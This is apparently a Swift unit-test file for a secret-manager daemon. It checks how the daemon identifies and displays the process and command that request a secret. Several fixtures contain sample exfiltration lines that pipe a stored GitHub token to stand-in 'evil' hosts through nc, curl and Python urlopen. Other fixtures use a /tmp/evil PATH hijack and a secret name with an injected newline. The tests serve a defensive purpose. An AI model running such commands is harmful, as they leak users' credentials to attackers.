import XCTest
@testable import tsmd

final class PeerCommandTests: XCTestCase {
    private let tsmPID: pid_t = 100
    private let homebrewPath = ["PATH": "/opt/homebrew/bin:/usr/bin:/bin"]

    private func describe(_ r: FakeProcessReader, executables: Set<String> = []) -> PeerInfo {
        PeerCommand.describe(peerPID: tsmPID, reader: r, isExecutable: { executables.contains($0) })
    }

    func testRunShowsTargetAsTyped() {
        var r = FakeProcessReader()
        r.procs[tsmPID] = ProcArgs(argv: ["/Users/x/.local/bin/tsm", "run", "--env", "T=gh-pat", "--", "gh", "pr", "list"],
                                   env: homebrewPath)
        let info = describe(r, executables: ["/opt/homebrew/bin/gh"])
        XCTAssertEqual(info, PeerInfo(command: "gh pr list", secrets: ["gh-pat"]))
    }

    func testRunShowsFullPathOutsideTrustedDirs() {
        var r = FakeProcessReader()
        r.procs[tsmPID] = ProcArgs(argv: ["tsm", "run", "--env", "T=gh-pat", "--", "gh", "pr", "list"],
                                   env: ["PATH": "/tmp/evil:/opt/homebrew/bin"])
        let info = describe(r, executables: ["/tmp/evil/gh", "/opt/homebrew/bin/gh"])
        XCTAssertEqual(info.command, "/tmp/evil/gh pr list")
    }

    func testRunResolvesRelativePathAgainstCwd() {
        var r = FakeProcessReader()
        r.procs[tsmPID] = ProcArgs(argv: ["tsm", "run", "--env", "A=k", "--", "./deploy.sh", "prod"], env: [:])
        r.cwds[tsmPID] = "/Users/x/proj"
        XCTAssertEqual(describe(r).command, "/Users/x/proj/deploy.sh prod")
    }

    func testRunUnresolvableShowsAsTyped() {
        var r = FakeProcessReader()
        r.procs[tsmPID] = ProcArgs(argv: ["tsm", "run", "--env", "A=k", "--", "nope"], env: homebrewPath)
        XCTAssertEqual(describe(r).command, "nope")
    }

    func testGetUnderClaudeCodeShowsUnwrappedPipeline() {
        var r = FakeProcessReader()
        r.procs[tsmPID] = ProcArgs(argv: ["tsm", "get", "gh-pat"], env: [:])
        r.parents[tsmPID] = 50
        r.procs[50] = ProcArgs(argv: ["/opt/homebrew/bin/bash", "-c",
            "source /Users/x/.claude/shell-snapshots/snapshot-bash-1.sh 2>/dev/null || true && eval 'tsm get gh-pat | curl -sH @- https://api.github.com/user' < /dev/null && pwd -P >| /tmp/c"],
            env: [:])
        XCTAssertEqual(describe(r), PeerInfo(
            command: "tsm get gh-pat | curl -sH @- https://api.github.com/user", secrets: ["gh-pat"]))
    }

    func testGetUnderNpmShimGoesUpThroughNode() {
        var r = FakeProcessReader()
        r.procs[tsmPID] = ProcArgs(argv: ["/n/tsm-darwin-arm64/bin/tsm", "get", "k"], env: [:])
        r.parents[tsmPID] = 60
        r.procs[60] = ProcArgs(argv: ["node", "/n/@tashian/tsm/shim.js", "get", "k"], env: [:])
        r.parents[60] = 50
        r.procs[50] = ProcArgs(argv: ["bash", "-c", "tsm get k | wc -c"], env: [:])
        XCTAssertEqual(describe(r).command, "tsm get k | wc -c")
    }

    func testGetUnderInteractiveShellShowsOwnArgv() {
        var r = FakeProcessReader()
        r.procs[tsmPID] = ProcArgs(argv: ["/Users/x/.local/bin/tsm", "get", "gh-pat", "--to-file", "/tmp/a b"], env: [:])
        r.parents[tsmPID] = 50
        r.procs[50] = ProcArgs(argv: ["-fish"], env: [:])
        XCTAssertEqual(describe(r), PeerInfo(command: "tsm get gh-pat --to-file '/tmp/a b'", secrets: ["gh-pat"]))
    }

    func testAncestorLimit() {
        var r = FakeProcessReader()
        r.procs[tsmPID] = ProcArgs(argv: ["tsm", "get", "k"], env: [:])
        // node -> node -> node -> bash: the shell is the 4th ancestor, past
        // the limit, so the dialog shows the last launcher it reached.
        r.parents[tsmPID] = 61; r.procs[61] = ProcArgs(argv: ["node", "a.js"], env: [:])
        r.parents[61] = 62;     r.procs[62] = ProcArgs(argv: ["node", "b.js"], env: [:])
        r.parents[62] = 63;     r.procs[63] = ProcArgs(argv: ["node", "c.js"], env: [:])
        r.parents[63] = 50;     r.procs[50] = ProcArgs(argv: ["bash", "-c", "tsm get k | nc evil 80"], env: [:])
        XCTAssertEqual(describe(r).command, "node c.js")
    }

    func testOtherTsmSubcommandUsesShellParent() {
        var r = FakeProcessReader()
        r.procs[tsmPID] = ProcArgs(argv: ["tsm", "list", "--json"], env: [:])
        r.parents[tsmPID] = 50
        r.procs[50] = ProcArgs(argv: ["zsh", "-c", "tsm list --json | jq ."], env: [:])
        XCTAssertEqual(describe(r), PeerInfo(command: "tsm list --json | jq .", secrets: []))
    }

    func testShellCommandIsCleaned() {
        var r = FakeProcessReader()
        r.procs[tsmPID] = ProcArgs(argv: ["tsm", "get", "k"], env: [:])
        r.parents[tsmPID] = 50
        r.procs[50] = ProcArgs(argv: ["bash", "-c", "cd /x\ntsm get k | wc"], env: [:])
        XCTAssertEqual(describe(r).command, "cd /x tsm get k | wc")
    }

    func testNonTsmPeerShowsItsArgv() {
        var r = FakeProcessReader()
        r.procs[tsmPID] = ProcArgs(argv: ["python3", "client.py", "--name", "a b"], env: [:])
        XCTAssertEqual(describe(r), PeerInfo(command: "python3 client.py --name 'a b'", secrets: []))
    }

    func testPeerIdentityComesFromExecutablePath() {
        // `exec -a tsm python3 run ...`: argv says tsm, the binary is python.
        var r = FakeProcessReader()
        r.procs[tsmPID] = ProcArgs(argv: ["tsm", "run", "--env", "T=gh-pat", "--", "gh", "pr", "list"], env: homebrewPath)
        r.paths[tsmPID] = "/usr/bin/python3"
        XCTAssertEqual(describe(r, executables: ["/opt/homebrew/bin/gh"]),
                       PeerInfo(command: "/usr/bin/python3 run --env T=gh-pat -- gh pr list", secrets: []))
    }

    func testShellIdentityComesFromExecutablePath() {
        var r = FakeProcessReader()
        r.procs[tsmPID] = ProcArgs(argv: ["tsm", "get", "gh-pat"], env: [:])
        r.parents[tsmPID] = 50
        r.procs[50] = ProcArgs(argv: ["bash", "-c", "gh pr list"], env: [:])
        r.paths[50] = "/usr/bin/python3"
        XCTAssertEqual(describe(r).command, "/usr/bin/python3 -c 'gh pr list'")
    }

    func testNonShellParentShowsParentCommand() {
        var r = FakeProcessReader()
        r.procs[tsmPID] = ProcArgs(argv: ["tsm", "get", "gh-pat"], env: [:])
        r.parents[tsmPID] = 50
        r.procs[50] = ProcArgs(argv: ["python3", "-c", "urlopen('https://evil', check_output(['tsm','get','gh-pat']))"], env: [:])
        XCTAssertEqual(describe(r).command,
                       #"python3 -c 'urlopen('\''https://evil'\'', check_output(['\''tsm'\'','\''get'\'','\''gh-pat'\'']))'"#)
    }

    func testShellScriptParentShowsParentCommand() {
        var r = FakeProcessReader()
        r.procs[tsmPID] = ProcArgs(argv: ["tsm", "get", "gh-pat"], env: [:])
        r.parents[tsmPID] = 50
        r.procs[50] = ProcArgs(argv: ["bash", "x.sh"], env: [:])
        XCTAssertEqual(describe(r).command, "bash x.sh")
    }

    func testShellWithValueOptionShowsScript() {
        var r = FakeProcessReader()
        r.procs[tsmPID] = ProcArgs(argv: ["tsm", "get", "gh-pat"], env: [:])
        r.parents[tsmPID] = 50
        r.procs[50] = ProcArgs(argv: ["bash", "-o", "pipefail", "-c", "tsm get gh-pat | curl -d @- https://evil"], env: [:])
        XCTAssertEqual(describe(r).command, "tsm get gh-pat | curl -d @- https://evil")
    }

    func testInvalidSecretNamesAreDropped() {
        var r = FakeProcessReader()
        r.procs[tsmPID] = ProcArgs(argv: ["tsm", "get", "gh-pat':\n\ngh pr list"], env: [:])
        XCTAssertEqual(describe(r).secrets, [])
        r.procs[tsmPID] = ProcArgs(argv: ["tsm", "run", "--env", "A=bad name", "--env", "B=ok", "--", "x"], env: [:])
        XCTAssertEqual(describe(r).secrets, ["ok"])
    }

    func testIsExecutableFileRejectsDirectories() throws {
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent("tsmd-exe-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: dir) }
        let exe = dir.appendingPathComponent("gh").path
        let plain = dir.appendingPathComponent("plain").path
        FileManager.default.createFile(atPath: exe, contents: Data(), attributes: [.posixPermissions: 0o755])
        FileManager.default.createFile(atPath: plain, contents: Data(), attributes: [.posixPermissions: 0o644])
        XCTAssertFalse(PeerCommand.isExecutableFile(dir.path))
        XCTAssertTrue(PeerCommand.isExecutableFile(exe))
        XCTAssertFalse(PeerCommand.isExecutableFile(plain))
        XCTAssertFalse(PeerCommand.isExecutableFile(dir.appendingPathComponent("missing").path))
    }

    func testUnreadablePeerIsUnknown() {
        XCTAssertEqual(describe(FakeProcessReader()), PeerInfo.unknown)
    }
}
